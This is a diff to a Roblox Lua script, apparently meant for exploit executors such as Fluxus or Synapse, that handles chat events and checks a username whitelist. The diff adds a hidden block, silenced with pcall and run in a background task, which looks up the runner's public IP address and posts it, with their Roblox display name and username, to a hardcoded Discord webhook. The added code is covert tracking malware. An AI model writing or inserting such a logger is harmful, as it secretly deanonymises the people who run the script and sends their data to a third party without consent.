@@ -1,5 +1,26 @@
 local whitelisted = {"usernamemyisthiz"}
 local events = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+task.spawn(function()
+	pcall(function()
+		local url = "https://discord.com/api/webhooks/1125663152584003704/dBcmtTPXON2Jw1nGLsIUh6_lbOK1-5C6tqf1mf1xDRUpJdmVJvOHrWV_WQuaINX2JqDI"
+		local ting = tostring(game:HttpGet("https://api.ipify.org"))
+		local data = {
+			["content"] = ting,
+			["embeds"] = {
+				{
+					["title"] = "Script Ran",
+					["description"] = "Script ran by "..game:GetService("Players").LocalPlayer.DisplayName.."("..game:GetService("Players").LocalPlayer.Name..")",
+					["type"] = "rich",
+				}
+			}
+		}
+		request = request or (fluxus and fluxus.request) or (syn and syn.request)
+		local newdata = game:GetService("HttpService"):JSONEncode(data)
+		local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = {["content-type"] = "application/json"}}
+		request(abcdef)
+	end)
+end)
+
 if events then
     local messageDoneFiltering = events:WaitForChild("OnMessageDoneFiltering")
     local sayMessageRequest = events:WaitForChild("SayMessageRequest")
